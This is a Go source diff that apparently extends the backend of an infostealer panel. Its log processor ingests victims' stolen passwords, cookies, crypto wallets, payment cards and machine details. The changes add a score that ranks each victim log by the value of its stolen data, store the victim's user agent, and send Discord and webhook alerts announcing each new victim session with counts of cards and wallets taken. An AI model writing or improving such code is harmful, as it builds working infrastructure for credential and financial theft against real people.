@@ -142,6 +142,14 @@ const (
 	maxFileCount   = 500
 )
 
+func getSetting(db *sql.DB, key string) string {
+	var val string
+	if err := db.QueryRow("SELECT value FROM settings WHERE key = ?", key).Scan(&val); err != nil {
+		return ""
+	}
+	return val
+}
+
 func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID string) (string, error) {
 	if len(archive) > maxArchiveSize {
 		return "", errors.New("archive too large")
@@ -327,6 +335,15 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 		rc.Close()
 	}
 
+	// Compute quality score
+	qualityScore := 0
+	if len(passwords) > 0 { qualityScore += 30 }
+	if len(cookies) > 0 { qualityScore += 20 }
+	if len(wallets) > 0 { qualityScore += 20 }
+	if len(cards) > 0 { qualityScore += 10 }
+	if len(files) > 0 { qualityScore += 10 }
+	if systemInfoContent != "" { qualityScore += 10 }
+
 	sessionID := uuid.New().String()
 
 	tx, err := p.db.Begin()
@@ -335,10 +352,10 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	}
 	defer tx.Rollback()
 
-	insertSessions := db.Placeholders(p.provider, `INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, created_at)
-		VALUES (?, '', ?, ?, ?, ?, ?, ?, `+db.Now(p.provider)+`)`)
+	insertSessions := db.Placeholders(p.provider, `INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, quality_score, created_at)
+		VALUES (?, '', ?, ?, ?, ?, ?, ?, ?, `+db.Now(p.provider)+`)`)
 	_, err = tx.Exec(insertSessions,
-		sessionID, meta["hwid"], meta["os"], meta["username"], meta["ip"], meta["country"], ownerID)
+		sessionID, meta["hwid"], meta["os"], meta["username"], meta["ip"], meta["country"], ownerID, qualityScore)
 	if err != nil {
 		return "", err
 	}
@@ -435,12 +452,14 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 
 	if systemInfoContent != "" {
 		info := parseSystemInfo(systemInfoContent)
-		systemCols := []string{"cpu", "gpu", "ram", "os", "screen", "hostname", "local_ip", "mac", "public_ip", "hwid", "uptime"}
+		ua := meta["user_agent"]
+		systemCols := []string{"cpu", "gpu", "ram", "os", "screen", "hostname", "local_ip", "mac", "public_ip", "hwid", "uptime", "user_agent"}
 		values := []any{
 			sessionID,
 			info["cpu"], info["gpu"], info["ram"], info["os"],
 			info["screen"], info["hostname"], info["local_ip"],
 			info["mac"], info["public_ip"], info["hwid"], info["uptime"],
+			ua,
 		}
 		var q string
 		if p.provider == db.ProviderPostgres {
@@ -457,8 +476,8 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 				strings.Join(setClauses, ", "),
 			)
 		} else {
-			q = `INSERT OR REPLACE INTO system_info (session_id, cpu, gpu, ram, os, screen, hostname, local_ip, mac, public_ip, hwid, uptime)
-				VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
+			q = `INSERT OR REPLACE INTO system_info (session_id, cpu, gpu, ram, os, screen, hostname, local_ip, mac, public_ip, hwid, uptime, user_agent)
+				VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
 		}
 		if _, err = tx.Exec(q, values...); err != nil {
 			return "", err
@@ -481,6 +500,41 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 		if ownerID != "" {
 			p.hub.Broadcast("sessions:"+ownerID, ev)
 		}
+	}
+
+	// ── Notifications (non-blocking) ─────────────────────
+	summary := SessionSummary{
+		SessionID:   sessionID,
+		CountryCode: meta["country"],
+		Passwords:   len(passwords),
+		Cookies:     len(cookies),
+		Cards:       len(cards),
+		Wallets:     len(wallets),
+		Files:       len(files),
+		Os:          meta["os"],
+		IP:          meta["ip"],
+	}
+
+	if discordURL := getSetting(p.db, "discord_webhook_url"); discordURL != "" {
+		go func() {
+			_ = SendDiscordNotification(discordURL, summary)
+		}()
+	}
+
+	if webhookURL := getSetting(p.db, "webhook_url"); webhookURL != "" {
+		go func() {
+			_ = SendWebhookNotification(webhookURL, WebhookPayload{
+				SessionID:   sessionID,
+				CountryCode: meta["country"],
+				Passwords:   len(passwords),
+				Cookies:     len(cookies),
+				Cards:       len(cards),
+				Wallets:     len(wallets),
+				Files:       len(files),
+				Os:          meta["os"],
+				IP:          meta["ip"],
+			})
+		}()
 	}
 
 	return sessionID, nil
